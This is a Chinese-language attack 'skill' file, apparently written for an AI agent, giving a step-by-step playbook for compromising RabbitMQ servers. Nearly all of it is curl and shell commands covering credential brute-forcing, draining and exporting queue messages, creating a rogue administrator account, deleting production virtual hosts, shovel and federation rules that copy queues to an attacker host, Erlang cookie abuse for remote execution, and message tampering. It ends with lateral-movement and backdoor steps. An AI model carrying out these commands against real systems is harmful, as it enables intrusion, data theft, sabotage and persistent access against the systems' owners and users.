---
name: rabbitmq-attack
type: attack
category: messaging
platform: rabbitmq
severity: high
---

# RabbitMQ 攻击技能

## 触发条件

- 发现 RabbitMQ 实例
- 可以访问 RabbitMQ
- 用户要求"攻击 RabbitMQ"

## 前置检查

```bash
# 1. 测试连接
rabbitmqctl cluster_status

# 2. 列出所有队列
rabbitmqctl list_queues

# 3. 检查版本
rabbitmqctl version
```

## 攻击方法

### 方法 1: 默认凭证攻击

```bash
# 1. 测试默认凭证
# 常见默认: guest/guest (仅限 localhost), admin/admin
curl -u guest:guest http://rabbitmq.example.com:15672/api/overview

# 2. 测试常见凭证
for creds in "admin:admin" "admin:password" "guest:guest"; do
  echo "Testing $creds"
  curl -u $creds http://rabbitmq.example.com:15672/api/overview
done

# 3. 暴力破解
hydra -L users.txt -P passwords.txt \
  rabbitmq.example.com http-get /api/overview
```

### 方法 2: 管理接口利用

```bash
# 1. 访问管理 API
curl -u admin:password http://rabbitmq.example.com:15672/api/overview

# 2. 列出所有虚拟主机
curl -u admin:password http://rabbitmq.example.com:15672/api/vhosts

# 3. 列出所有用户
curl -u admin:password http://rabbitmq.example.com:15672/api/users

# 4. 获取用户权限
curl -u admin:password http://rabbitmq.example.com:15672/api/permissions
```

### 方法 3: 队列消息窃取

```bash
# 1. 列出所有队列
curl -u admin:password http://rabbitmq.example.com:15672/api/queues

# 2. 获取队列中的消息
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME/get \
  -H "content-type: application/json" \
  -d '{"count": 10, "requeue": false, "encoding": "auto"}'

# 3. 监听队列（实时消息）
# 使用 AMQP 客户端或浏览器管理界面

# 4. 导出所有消息
for queue in $(curl -s -u admin:password http://rabbitmq.example.com:15672/api/queues | jq -r '.[].name'); do
  echo "=== Queue: $queue ==="
  curl -u admin:password \
    "http://rabbitmq.example.com:15672/api/queues/%2F/$queue/get" \
    -H "content-type: application/json" \
    -d '{"count": 10000, "requeue": false}'
done > /tmp/rabbitmq-messages.txt
```

### 方法 4: Exchange 利用

```bash
# 1. 列出所有 Exchange
curl -u admin:password http://rabbitmq.example.com:15672/api/exchanges

# 2. 获取 Exchange 详情
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/exchanges/VHOST/EXCHANGE_NAME

# 3. 查看绑定关系
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/exchanges/VHOST/EXCHANGE_NAME/bindings/source

# 4. 发布恶意消息到 Exchange
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/exchanges/VHOST/EXCHANGE_NAME/publish \
  -H "content-type: application/json" \
  -d '{"routing_key": "malicious", "payload": "malicious data", "payload_encoding": "string"}'
```

### 方法 5: 用户凭证窃取

```bash
# 1. 获取所有用户
curl -u admin:password http://rabbitmq.example.com:15672/api/users | jq '.'

# 2. 创建新用户（如果有权限）
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/users/attacker \
  -H "content-type: application/json" \
  -d '{"password": "password123", "tags": "administrator"}'

# 3. 授予权限
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/permissions/%2F/attacker \
  -H "content-type: application/json" \
  -d '{"configure": ".*", "write": ".*", "read": ".*"}'

# 4. 修改用户密码
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/users/victim/change-password \
  -H "content-type: application/json" \
  -d '{"password": "newpassword"}'
```

### 方法 6: 虚拟主机利用

```bash
# 1. 列出所有虚拟主机
curl -u admin:password http://rabbitmq.example.com:15672/api/vhosts

# 2. 创建恶意虚拟主机
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/vhosts/malicious-vhost \
  -H "content-type: application/json" \
  -d '{}'

# 3. 删除虚拟主机（拒绝服务）
curl -X DELETE -u admin:password \
  http://rabbitmq.example.com:15672/api/vhosts/PRODUCTION_VHOST
```

### 方法 7: 策略和参数利用

```bash
# 1. 获取所有策略
curl -u admin:password http://rabbitmq.example.com:15672/api/policies

# 2. 获取策略详情
curl -u admin:password http://rabbitmq.example.com:15672/api/policies/VHOST/policy-name

# 3. 创建恶意策略（例如：Federation 或 Shovel）
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/parameters/shovel/VHOST/malicious-shovel \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "src-uri": "amqp://source-host",
      "src-queue": "sensitive-queue",
      "dest-uri": "amqp://attacker-host",
      "dest-queue": "stolen-queue"
    }
  }'

# 4. 创建 Federation 策略（数据镜像）
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/parameters/federation-upstream/VHOST/attacker-upstream \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "uri": "amqp://attacker-host",
      "prefetch-count": 1000
    }
  }'
```

### 方法 8: 集群信息窃取

```bash
# 1. 获取集群状态
rabbitmqctl cluster_status

# 2. 获取节点信息
curl -u admin:password http://rabbitmq.example.com:15672/api/nodes

# 3. 获取连接信息
curl -u admin:password http://rabbitmq.example.com:15672/api/connections

# 4. 获取通道信息
curl -u admin:password http://rabbitmq.example.com:15672/api/channels
```

### 方法 9: Erlang Cookie 利用

```bash
# 1. 如果可以访问服务器文件系统
cat /var/lib/rabbitmq/.erlang.cookie

# 2. 使用 Cookie 连接集群
# 如果有 Erlang Cookie，可以远程执行命令
erl -sname debug -setcookie YOUR_COOKIE

# 3. 或使用 rabbitmqctl 从远程
RABBITMQ_ERLANG_COOKIE=$(cat /var/lib/rabbitmq/.erlang.cookie)
rabbitmqctl -n rabbit@target-node cluster_status
```

### 方法 10: 消息篡改和删除

```bash
# 1. 删除队列中的消息
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME/contents \
  -H "content-type: application/json" \
  -d '{"value": "[]}'

# 2. 清空队列
curl -X DELETE -u admin:password \
  http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME/contents

# 3. 删除队列
curl -X DELETE -u admin:password \
  http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME

# 4. 篡改消息
# 获取消息，修改后重新发布
curl -u admin:password \
  "http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 1, "requeue": false}' > /tmp/message.json

# 修改消息内容后重新发布
curl -u admin:password \
  "http://rabbitmq.example.com:15672/api/exchanges/VHOST/amq.default/publish" \
  -H "content-type: application/json" \
  -d @/tmp/modified-message.json
```

## 验证成功

```bash
# 成功登录
curl -u admin:password http://rabbitmq.example.com:15672/api/overview

# 成功列出队列
rabbitmqctl list_queues

# 成功获取消息
curl -u admin:password \
  http://rabbitmq.example.com:15672/api/queues/VHOST/QUEUE_NAME/get \
  -H "content-type: application/json" \
  -d '{"count": 1}'
```

## 下一步

1. 分析窃取的消息中的敏感信息
2. 使用发现的凭证访问其他系统
3. 通过 RabbitMQ 建立持久化后门
4. 攻击使用 RabbitMQ 的应用程序
